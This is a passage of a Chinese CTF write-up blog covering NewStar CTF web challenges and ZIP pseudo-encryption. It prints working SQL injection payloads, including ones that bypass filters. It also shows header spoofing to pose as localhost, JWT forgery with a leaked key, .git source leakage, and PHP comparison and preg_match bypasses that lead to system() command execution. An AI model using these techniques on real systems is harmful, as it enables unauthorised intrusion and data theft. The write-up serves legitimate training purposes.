+<p>提示query一下（ask&#x3D;miao），<strong>Query</strong>指的是<strong>Get传参</strong>，于是在网址后加上**&#x2F;?ask&#x3D;miao**</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241026091342260.png" alt="image-20241026091342260"></p>
+<p>这里提示用<strong>Method</strong>传参<strong>say&#x3D;hello</strong>，method指的是<strong>post传参</strong>，于是直接使用工具hackbar进行传参</p>
+<p>刚来到第四关时发现POST请求变成了GET请求，于是再次使用POST传参，得到下一步提示</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241026092023306.png" alt="image-20241026092023306"></p>
+<p>这里要求user-Agent为Papa，Agent的标准格式如下：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241026221740797.png" alt="image-20241026221740797"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: &lt;product&gt; / &lt;product-version&gt; &lt;comment&gt;</span><br><span class="line"></span><br><span class="line">所以这里&lt;product&gt;应该为Papa，version随便，comment可以为空啊</span><br><span class="line">User-Agent:Papa/1.0</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241026222013923.png" alt="image-20241026222013923"></p>
+<p>然后将say改成<strong>玛卡巴卡阿卡哇卡米卡玛卡呣</strong>，然后进入第五关传参又变成了Get模式，再次重新传参得到正确提示</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241026223410431.png" alt="image-20241026223410431"></p>
+<p>（我这里是因为hackbar突然抽了传参和修改User-Agent不能同时进行，所以使用了burp，前面的操作案例来说其实还是要用hackbar会方便一点）</p>
+<p>PATCH 包的格式与 POST 无异，使用 Content-Type: multipart&#x2F;form-data 发包即可，注意该 Header 的值后面需要加一个 boundary 表示界定符。例如Content-Type: multipart&#x2F;form-data; boundary&#x3D;abc，那么在 Body 中，以 –abc 表示一个查询字段的开始，当所有查询字段结束后，用 –abc– 表示结束。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241026232959353.png" alt="image-20241026232959353"></p>
+<p>使用patch发包得到上诉提示，提示将cookie修改为eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.FHgKnNyEFasKAtd86byK8wrJMg513DtbOOY3pFzzj0Q</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241026234312425.png" alt="image-20241026234312425"></p>
+<p>提示要让服务器认为这是一个来自本地的请求，可以通过设置 Host X-Real-IP，X-Forwarded-For，Referer 等标头欺骗服务器。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">GET /?ask=miao HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Referer: http://localhost</span><br><span class="line">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.SlKAeN5yYDF9YaHrUMifhYSrilyjPwd2_Yrywq9ff1Y</span><br><span class="line"></span><br><span class="line">GET /?ask=miao HTTP/1.1</span><br><span class="line">Host: 39.106.48.123:37508</span><br><span class="line">X-Real-IP: 127.0.0.1</span><br><span class="line">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.SlKAeN5yYDF9YaHrUMifhYSrilyjPwd2_Yrywq9ff1Y</span><br><span class="line"></span><br><span class="line">GET /?ask=miao HTTP/1.1</span><br><span class="line">Host: 39.106.48.123:37508</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJsZXZlbCI6Nn0.SlKAeN5yYDF9YaHrUMifhYSrilyjPwd2_Yrywq9ff1Y</span><br></pre></td></tr></table></figure>
+
+<p>绕过后来到如下：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241026234720001.png" alt="image-20241026234720001"></p>
+<p>提示为<a target="_blank" rel="noopener" href="https://jwt.io/">JWT加密</a></p>
+<p>其中提到了 JWT 和 Pe2K7kxo8NMIkaeN，这个数字和字母组成内容推测应当是 JWT 的密钥。JWT 是一个轻量级的认证规范，允许在用户和服务器之间传递安全可靠的信息，但这是基于签名密钥没有泄露的情况下。可以通过 JWT.IO 网站进行在线签名和验证（JWT 并不对数据进行加密，而仅仅是签名，不同的数据对应的羡签名不一样，因此在没有密钥的情况下，你可以查看里面的数据，但修改它则会导致服务器验签失败，从而拒绝你的进一步请求）。</p>
+<p>将我们当前的 Cookie 粘贴入网站：将密匙填入最右边最下面那一栏，再将level修改为0</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241026235731459.png" alt="image-20241026235731459"></p>
+<p>最左边出现了新的cookie，修改cookie值后跳转既能拿到flag</p>
+<h4 id="谢谢皮蛋"><a href="#谢谢皮蛋" class="headerlink" title="谢谢皮蛋"></a>谢谢皮蛋</h4><p>感觉像sql注入，随便试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1 and 1=1#</span><br><span class="line">-- 有回显</span><br><span class="line"></span><br><span class="line">1 and 1=2#</span><br><span class="line">-- 无回显</span><br><span class="line"></span><br><span class="line">-- 证明是数字注入</span><br><span class="line"></span><br><span class="line">1 ordr by 2#</span><br><span class="line">-- 2有回显，3无回显，证明只有两个字段</span><br><span class="line"></span><br><span class="line">-1 union select 1，2</span><br><span class="line">-- 判断回显位置</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241027124612944.png" alt="image-20241027124612944"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">-1 union select database(),2#</span><br><span class="line">-- 爆数据库名</span><br><span class="line"></span><br><span class="line">-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#</span><br><span class="line">-- 爆表名，得到表名为Fl4g，hexo</span><br><span class="line"></span><br><span class="line">-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#x27;Fl4g&#x27; and table_schema=database()#</span><br><span class="line">-- Fl4g的列名为id，des，value</span><br><span class="line"></span><br><span class="line">-1 union select 1,(select group_concat(id,des,value) from Fl4g)</span><br><span class="line">-- 得到flag</span><br></pre></td></tr></table></figure>
+
+<h3 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h3><h4 id="你能在一秒内打出八句英文吗"><a href="#你能在一秒内打出八句英文吗" class="headerlink" title="你能在一秒内打出八句英文吗"></a>你能在一秒内打出八句英文吗</h4><p>写个脚本实现网页交互识别文本并post文本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="comment"># BeautifulStoneSoup用来筛选我们需要的数据</span></span><br><span class="line"><span class="comment"># from bs4 import BeautifulSoup # python导入模块，此题使用requests库和BeautifulSoup，前者用来发送求，得到返回报文，后者用来筛选我们需要的数据进行发送</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># 通过测试，我们可以发现刚开始的时候，题目位于strat处，点击提交后转到submit处</span></span><br><span class="line">url_start = <span class="string">&#x27;http://eci-2ze420okq7lqpe673ox9.cloudeci1.ichunqiu.com/start&#x27;</span></span><br><span class="line">url_submit = <span class="string">&#x27;http://eci-2ze420okq7lqpe673ox9.cloudeci1.ichunqiu.com/submit&#x27;</span></span><br><span class="line">session = requests.session() <span class="comment">#创建session会话</span></span><br><span class="line"></span><br><span class="line">response_start = session.get(url_start) <span class="comment">#通过get方法访问，获取返回的报文​</span></span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(response_start.text, <span class="string">&#x27;html.parser&#x27;</span>)<span class="comment"># 创建BeautifulSoup对象并使用html.parser进行解析</span></span><br><span class="line"></span><br><span class="line">p_tag = soup.find(<span class="string">&#x27;p&#x27;</span>,<span class="built_in">id</span>=<span class="string">&#x27;text&#x27;</span>) <span class="comment"># 找到有p标签的文字</span></span><br><span class="line"></span><br><span class="line">text_content = p_tag.text <span class="comment">#转换为文字</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 准备POST请求的数据</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;user_input&#x27;</span>: text_content</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 使用同一个会话对象发送POST请求</span></span><br><span class="line">response_submit = session.post(url_submit, data=data)</span><br><span class="line"><span class="comment"># 打印提交后的响应内容，可以看到回显得到flag</span></span><br><span class="line"><span class="built_in">print</span>(response_submit.text)</span><br><span class="line"><span class="comment"># p id 以及&#x27;user_input&#x27;都是由页面源代码分析得到的</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="遗失的拉链"><a href="#遗失的拉链" class="headerlink" title="遗失的拉链"></a>遗失的拉链</h4><p>拉链的英文是zip，也就是常见压缩包的格式，当网站的代码有备份时，容易出现代码泄露，其中<a target="_blank" rel="noopener" href="http://www.zip就是常见的备份文件泄露之一,通过访问/www.zip%E5%8F%AF%E4%BB%A5%E5%BE%97%E5%88%B0%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81%EF%BC%8C%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%87%8C%E9%9D%A2%E6%9C%89%E4%B8%80%E4%B8%AApizwww.php,%E5%AE%A1%E8%AE%A1%E4%B8%80%E4%B8%8B%E4%BB%A3%E7%A0%81">www.zip就是常见的备份文件泄露之一，通过访问/www.zip可以得到网站源码，压缩包里面有一个pizwww.php,审计一下代码</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//for fun</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>])&amp;&amp;<span class="variable">$_GET</span>[<span class="string">&#x27;new&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;star&#x27;</span>])&#123;</span><br><span class="line">        <span class="comment">//欸 为啥sha1和md5相等呢</span></span><br><span class="line">        <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/cat|flag/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;u can not do this &quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Wrong&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">php其中的两种比较符号:</span><br><span class="line">==：先将字符串类型转化成相同，再比较（松散比较 只比较值，不比较数据类型）</span><br><span class="line">===：先判断两种字符串的类型是否相等，再比较</span><br><span class="line">（若字符型值开头为数字，转为数字；若开头不为数字，为 null 弱比较与 0 相等。）</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;abc123&#x27;&#x27;==123 =&gt; false</span><br><span class="line">&#x27;&#x27;abc123&#x27;&#x27;==0 =&gt; true</span><br><span class="line">&quot;123abc&quot;==123 =&gt; true</span><br><span class="line"></span><br><span class="line">对于php强比较和弱比较：md5()，sha1()函数无法处理数组，如果传入的为数组，会返回NULL，两个数组经过加密后得到的都是NULL，也就是相等的。</span><br></pre></td></tr></table></figure>
+
+<p>所以下面能绕过比较：</p>
+<p>?new[]&#x3D;1<br>        star[]&#x3D;2</p>
+<p>cmd中还可以传入system()函数，这个函数可以执行系统命令，但是前面提到过滤了cat和flag两个字符，也就考察我们绕过，除了cat以外我们还能使用tac（从文件最后一行输出内容）等其他命令输出文件内容。而对于flag的过滤，我们可以使用通配符<em>（匹配任意长度的任意字符（包括空字符））来解决，cmd&#x3D;system(“tac &#x2F;fl</em>“);<br>这样就能得到flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241030214237232.png" alt="image-20241030214237232"></p>
+<h4 id="谢谢皮蛋plus"><a href="#谢谢皮蛋plus" class="headerlink" title="谢谢皮蛋plus"></a>谢谢皮蛋plus</h4><p>这道题是双引号闭合并过滤了and和空格</p>
+<p>所以我们可以用如下命令进行sql注入、</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&quot;/**/union/**/select/**/1,2#</span><br><span class="line">-- 判断回显位置</span><br><span class="line">-1&quot;<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>database(),<span class="number">2</span>#</span><br><span class="line"><span class="comment">-- 查数据库名</span></span><br><span class="line"><span class="number">-1</span>&quot;/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/=/**/database()#</span><br><span class="line">-- 查表名</span><br><span class="line">-1&quot;<span class="comment">/**/</span><span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>,group_concat(column_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name<span class="comment">/**/</span><span class="operator">=</span><span class="comment">/**/</span><span class="string">&#x27;Fl4g&#x27;</span><span class="comment">/**/</span><span class="operator">&amp;&amp;</span><span class="comment">/**/</span>table_schema<span class="comment">/**/</span><span class="operator">=</span><span class="comment">/**/</span>database()#</span><br><span class="line"><span class="comment">-- 查列名</span></span><br><span class="line"><span class="number">-1</span>&quot;/**/union/**/select/**/group_concat(id,des,value),2/**/from/**/Fl4g#</span><br><span class="line">-- 得到flag</span><br></pre></td></tr></table></figure>
+
+<h4 id="PangBai-过家家（2）"><a href="#PangBai-过家家（2）" class="headerlink" title="PangBai 过家家（2）"></a>PangBai 过家家（2）</h4><p>首先题目动画提示存在后门，于是我们可以使用dirsearch进行扫描，我的dirsearch是在kali当中运行的，具体用法是：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u url</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241031164653853.png" alt="image-20241031164653853"></p>
+<p>然后发现我们能访问.git目录，git就是一个用来管理代码版本的工具，我们可以通过git的漏洞发现版本的代码，得到题目要求的后门<br>网上有很多版本的针对git漏洞的工具，比如<strong>githacker</strong>工具</p>
+<p>安装方法如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install githacker</span><br></pre></td></tr></table></figure>
+
+<p>之后还需加入环境变量中，如果不知道该怎么做建议直接在终端输入githacker后查询报错然后自行百度解决方法）</p>
+<p>于是我们可以使用如下命令将.git文件夹中泄露文件到本地</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">githacker --url url --output-folder pangbai2</span><br><span class="line"><span class="comment">#这里的第二个url要改成自己靶机网址</span></span><br><span class="line"><span class="comment">#这条命令的意思是使用 githacker 工具对指定的 URL 下的.git文件夹下文件保存到本地名为 pangbai2 的文件夹</span></span><br></pre></td></tr></table></figure>
+
+<p>然后进入下载的文件夹中使用git命令</p>
+<p>可以使用 git 命令查看当前项目的信息，比如使用 <code>git log </code>查看提交历史</p>
+<p>通过 <code>git stash list</code>，可以查看所有存储的更改记录，以便后续应用、查看或删除。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241031180702771.png" alt="image-20241031180702771"></p>
+<p>git stash list 用于列出当前 Git 仓库中所有的 stash（临时保存的工作状态）</p>
+<p>这条命令显示你在 main 分支上创建了一个 stash，0 是最新的 stash，Backdoor是关于这条stash的描述</p>
+<p>可以用<code>git stash apply</code> 或 <code>git stash pop</code> 来恢复这些更改</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git stash apply stash@&#123;0&#125;</span><br><span class="line"><span class="comment">#将这个更改应用到当前目录中，我们就成功下载到了后门文件</span></span><br></pre></td></tr></table></figure>
+
+<p>然后进行代码审计</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;papa&#x27;</span>] !== <span class="string">&#x27;TfflxoU0ry7c&#x27;</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">show_backdoor</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;NewStar_CTF.2024&#x27;</span>] !== <span class="string">&#x27;Welcome&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^Welcome$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;NewStar_CTF.2024&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_msg</span>(<span class="string">&#x27;PangBai loves you!&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;func&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;args&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_msg</span>(<span class="string">&#x27;PangBai hates you!&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>这段代码的要求是post传参让<code>papa=TfflxoU0ry7c</code>然后get传参让<code>NewStar_CTF.2024=welcome</code>但是又不能有welcome，看似是矛盾的，但是这里考察的是对于preg_match的绕过，preg_match不会检测换行符，**$** 除了匹配整个字符串的结尾，还能够匹配字符串最后一个换行符。如果是使用了 &#x2F;D 修饰符，表示在匹配时会忽略换行符</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^Welcome$/D&#x27;</span>, <span class="string">&quot;Welcome\n&quot;</span>)</span><br><span class="line">    <span class="comment">//使用 /D 修饰符后，正则表达式依然只会匹配开头为 &quot;Welcome&quot; 的部分，但会忽略结尾的换行符。</span></span><br></pre></td></tr></table></figure>
+
+<p>换行符的url编码是%0a，在welcome之后加上便可绕过</p>
+<p>但如果直接传参 NewStar_CTF.2024&#x3D;Welcome%0A 会发现并没有用。这是由 NewStar_CTF.2024 中的特殊字符 . 引起的，<strong>PHP 默认会将其解析为 NewStar_CTF_2024. 在 PHP 7 中，可以使用 [ 字符的非正确替换漏洞。当传入的参数名中出现 [ 且之后没有 ] 时，PHP 会将 [ 替换为 _，但此之后就不会继续替换后面的特殊字符了</strong></p>
+<p>接下来到了call_user_func()函数，这个php函数简单来说就是前一个参数是你要执行的函数，后一个参数是将要被执行的函数的参数，我们可以使用system(‘xxxxx’),来执行系统命令，当我们什么都没有发现的时候，我们就可以看看<strong>环境变量（env）</strong>，很多题的flag可能就放在这里面</p>
+<p><strong>注意：这里的Welcome中W是大写的！！！搞了好久因为大小写错了没绕过也是服了，</strong>具体参数如下：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20241031225559598.png" alt="image-20241031225559598"></p>
+<h1 id="re"><a href="#re" class="headerlink" title="re"></a>re</h1><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="CTFshow-2"><a href="#CTFshow-2" class="headerlink" title="CTFshow"></a>CTFshow</h2><h3 id="杂项签到"><a href="#杂项签到" class="headerlink" title="杂项签到"></a>杂项签到</h3><h4 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h4><p>一个ZIP文件由三大部分组成：<strong>压缩源文件数据区+压缩源文件目录区+压缩源文件目录结束标志</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i-blog.csdnimg.cn/blog_migrate/c1004bdbf17b6ab30360b180a18f8c23.png" alt="img"></p>
+<p><strong>压缩源文件数据区：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">第0~3个字节：50 4B 03 04，代表了文件头标志</span><br><span class="line">第4~5个字节：14 00，代表了解压文件所需的pkware版本</span><br><span class="line">第6~7个字节：00 00，代表了全局方式位标记（用来判断有没有加密）</span><br><span class="line">第8~9个字节：08 00，代表了压缩方式</span><br><span class="line">第10~11个字节：1D 9B，代表了最后修改文件的时间</span><br><span class="line">第12~13个字节：3D 56，代表了最后修改文件的日期</span><br><span class="line">第14~17个字节：5A 48 63 5C，是zip文件的crc-32校验值</span><br><span class="line">第18~21个字节：77 00 00 00，是文件压缩后的尺寸</span><br><span class="line">第22~25个字节：B1 00 00 00，是文件未压缩前的尺寸</span><br><span class="line">第26~27个字节：10 00，代表文件名长度</span><br><span class="line">第28~29个字节：00 00，代表扩展记录长度</span><br></pre></td></tr></table></figure>
+
+<p><strong>压缩源文件目录区：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1、第0~3个字节：50 4B 01 02，代表了目录文件头标记</span><br><span class="line"></span><br><span class="line">2、第4~5个字节：02 3F，代表了压缩使用的pkware版本</span><br><span class="line"></span><br><span class="line">3、第6~7个字节：14 00，代表了解压文件所需的pkware版本</span><br><span class="line"></span><br><span class="line">4、第8~9个字节：00 00，代表了全局方式位标记（用来判断是否为伪加密）</span><br><span class="line"></span><br><span class="line">5、第10~11个字节：08 00，代表了压缩方式</span><br><span class="line"></span><br><span class="line">6、第12~13个字节：1D 9B，代表了最后修改文件的时间</span><br><span class="line"></span><br><span class="line">7、第14~15个字节：3D 56，代表了最后修改文件的日期</span><br><span class="line"></span><br><span class="line">8、第16~19个字节：5A 48 63 5C，是zip文件的crc-32校验值</span><br><span class="line"></span><br><span class="line">9、第16~19个字节：77 00 00 00，是文件压缩后的大小</span><br><span class="line"></span><br><span class="line">10、第24~27个字节：B1 00 00 00，是文件未压缩前的大小</span><br><span class="line"></span><br><span class="line">11、第28~29个字节：10 00，代表文件名长度</span><br><span class="line"></span><br><span class="line">12、第30~31个字节：00 00，代表扩展字段长度</span><br><span class="line"></span><br><span class="line">13、第32~33个字节：00 00，代表文件注释长度</span><br></pre></td></tr></table></figure>
+
+<p><strong>压缩源文件目录结束标志：</strong></p>
